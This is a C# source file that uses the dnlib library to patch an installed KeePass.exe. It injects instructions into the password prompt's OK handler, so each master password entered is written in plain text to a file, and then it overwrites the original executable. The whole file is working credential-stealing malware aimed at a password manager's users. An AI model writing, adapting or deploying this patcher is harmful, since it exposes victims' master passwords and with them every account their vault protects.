using dnlib.DotNet;
using dnlib.DotNet.Emit;
using KeePassKey.Manager;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using KeePassKey.Model;
using System.Xml.Serialization;

namespace KeePassKey
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //XmlSerializer serializer = new XmlSerializer(typeof(Configuration));
            //MemoryStream memStream = new MemoryStream(Encoding.UTF8.GetBytes(File.ReadAllText("KeePass.config.xml")));
            //Configuration resultingMessage = (Configuration)serializer.Deserialize(memStream);

            string keePassPath = Path.Combine(KeePass.FindKeePassInstallation(), "KeePass.exe");

            if (!File.Exists(keePassPath))
                return;

            ModuleDefMD module = ModuleDefMD.Load(keePassPath);

            KeePass.UninstallNgen(module.Assembly.FullName);

            var secureTextBoxType = module.Types.FirstOrDefault(t => t.FullName == "KeePass.UI.SecureTextBoxEx");
            var protectedStringType = module.Types.FirstOrDefault(t => t.FullName == "KeePassLib.Security.ProtectedString");
            var keyPromptFormType = module.Types.FirstOrDefault(t => t.FullName == "KeePass.Forms.KeyPromptForm");

            var btnOkMethod = keyPromptFormType.Methods.FirstOrDefault(m => m.Name == "OnBtnOK");
            var passwordField = keyPromptFormType.Fields.FirstOrDefault(f => f.Name == "m_tbPassword");
            var writeAllTextMethod = module.Import(typeof(File).GetMethod("WriteAllText", new[] { typeof(string), typeof(string) }));

            var patchInstructions = new Instruction[]
            {
                Instruction.Create(OpCodes.Ldstr, "<PATH>\\keepass_master_password.txt"),
                Instruction.Create(OpCodes.Ldarg_0),
                Instruction.Create(OpCodes.Ldfld, passwordField),
                Instruction.Create(OpCodes.Callvirt, secureTextBoxType.Methods.First(m => m.Name == "get_TextEx")),
                Instruction.Create(OpCodes.Callvirt, protectedStringType.Methods.First(m => m.Name == "ReadString")),
                Instruction.Create(OpCodes.Call, keyPromptFormType.Module.Import(writeAllTextMethod))
            };

            for (int i = 0; i < patchInstructions.Length; i++)
                btnOkMethod.Body.Instructions.Insert(i, patchInstructions[i]);

            MemoryStream ms = new MemoryStream();

            module.Write(ms);
            module.Dispose();

            File.WriteAllBytes(keePassPath, ms.ToArray());
        }
    }
}
